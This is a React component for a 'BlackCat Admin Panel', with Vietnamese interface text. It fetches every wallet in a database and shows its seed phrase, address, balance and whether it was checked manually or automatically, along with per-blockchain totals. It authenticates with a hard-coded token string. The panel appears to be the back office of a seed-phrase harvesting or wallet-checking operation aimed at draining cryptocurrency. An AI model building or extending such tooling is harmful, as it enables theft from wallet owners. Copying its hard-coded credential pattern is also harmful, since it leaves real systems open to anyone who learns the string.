import React, { useState, useEffect } from "react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Wallet } from "@shared/schema";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";

interface AdminDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

export function AdminDialog({ open, onOpenChange }: AdminDialogProps) {
  const [wallets, setWallets] = useState<Wallet[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (open) {
      fetchWallets();
    }
  }, [open]);

  const fetchWallets = async () => {
    try {
      setLoading(true);
      setError(null);

      const response = await fetch("/api/admin/query-wallets", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ token: "BlackCat" }),
      });

      if (!response.ok) {
        throw new Error(`API error: ${response.status}`);
      }

      const data = await response.json();
      setWallets(data.wallets || []);
    } catch (err) {
      console.error("Failed to fetch wallets:", err);
      setError("Không thể tải dữ liệu ví. Vui lòng thử lại sau.");
    } finally {
      setLoading(false);
    }
  };

  // Tính tổng số dư theo từng loại blockchain
  const calculateTotalBalance = () => {
    const totals: Record<string, number> = {};
    
    wallets.forEach(wallet => {
      const blockchain = wallet.blockchain;
      const balance = parseFloat(wallet.balance);
      
      if (!isNaN(balance)) {
        if (!totals[blockchain]) {
          totals[blockchain] = 0;
        }
        totals[blockchain] += balance;
      }
    });
    
    return totals;
  };

  const totalBalances = calculateTotalBalance();

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-[900px] max-h-[80vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle>BlackCat Admin Panel</DialogTitle>
          <DialogDescription>
            Hiển thị tất cả ví có trong database
          </DialogDescription>
        </DialogHeader>

        {loading && <div className="my-4 text-center">Đang tải dữ liệu...</div>}
        
        {error && (
          <div className="my-4 p-3 bg-red-100 text-red-800 rounded-md">
            {error}
          </div>
        )}

        {!loading && !error && wallets.length === 0 && (
          <div className="my-4 text-center">
            Không có dữ liệu ví nào trong database.
          </div>
        )}

        {wallets.length > 0 && (
          <>
            <div className="bg-slate-100 dark:bg-slate-800 p-3 rounded-md mb-4">
              <h3 className="font-medium mb-2">Tổng số dư:</h3>
              <div className="grid grid-cols-2 md:grid-cols-5 gap-2">
                {Object.entries(totalBalances).map(([blockchain, balance]) => (
                  <div key={blockchain} className="bg-white dark:bg-slate-700 p-2 rounded-md">
                    <span className="font-bold">{blockchain}:</span> {balance}
                  </div>
                ))}
              </div>
            </div>

            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Blockchain</TableHead>
                  <TableHead>Seed Phrase</TableHead>
                  <TableHead>Address</TableHead>
                  <TableHead>Số dư</TableHead>
                  <TableHead>Loại</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {wallets.map((wallet) => (
                  <TableRow key={`${wallet.blockchain}-${wallet.address}`}>
                    <TableCell>{wallet.blockchain}</TableCell>
                    <TableCell>
                      <div className="max-w-[200px] overflow-hidden text-ellipsis whitespace-nowrap" 
                           title={wallet.seedPhrase}>
                        {wallet.seedPhrase}
                      </div>
                    </TableCell>
                    <TableCell>
                      <div className="max-w-[150px] overflow-hidden text-ellipsis whitespace-nowrap" 
                           title={wallet.address}>
                        {wallet.address}
                      </div>
                    </TableCell>
                    <TableCell>{wallet.balance}</TableCell>
                    <TableCell>{wallet.isManualCheck ? "Thủ công" : "Tự động"}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </>
        )}
      </DialogContent>
    </Dialog>
  );
}